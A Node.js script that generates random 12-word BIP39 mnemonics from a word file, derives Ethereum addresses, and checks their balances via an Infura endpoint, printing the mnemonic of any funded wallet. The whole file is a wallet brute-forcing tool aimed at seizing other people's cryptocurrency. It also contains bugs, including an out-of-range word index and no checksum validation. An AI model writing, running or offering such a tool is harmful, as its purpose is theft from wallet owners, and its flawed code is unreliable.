const Web3 = require('web3');
const web3 = new Web3('https://mainnet.infura.io/v3/*Your infuta key*');

const bip39 = require('bip39');
const hdkey = require('ethereumjs-wallet/hdkey');

var wordList = [];

function getWordsFromFile () {
  require('fs').readFileSync('pathToFile/words.txt', 'utf-8').split(/\r?\n/).forEach(function(line){
    wordList.push(line);
  })
  if(wordList.length > 0) {console.log('Words successfully imported.'); generateMnemonic();}
  else {console.log('Words not imported.');}

}

function generateMnemonic () {
  let mnemonic = '';
  let randomNumber;

  for (let i = 0 ; i < 12; i ++) {
    randomNumber = Math.floor(Math.random() * wordList.length - 1);
    mnemonic = mnemonic + wordList[randomNumber] + ' ';
  }
  findBalance(mnemonic);
}

function findBalance (_mnemonic) {
  const hdwallet = hdkey.fromMasterSeed(bip39.mnemonicToSeed(_mnemonic));
  const path = "m/44'/60'/0'/0/0";
  const wallet = hdwallet.derivePath(path).getWallet();
  const address = `0x${wallet.getAddress().toString('hex')}`;

  process.stdout.cursorTo(0);
  process.stdout.write(`Checking: ${address}`);

  checkBalance ();

  async function checkBalance () {
    let balance = await web3.eth.getBalance(address);
    if(balance > 0) {
      console.log('\n');
      console.log('mnemonic --->>' + ' '+ _mnemonic)
      console.log('balance --->>' + ' '+ balance)
      console.log('\n');
    } else {
      generateMnemonic();
    }
  }
}



getWordsFromFile();
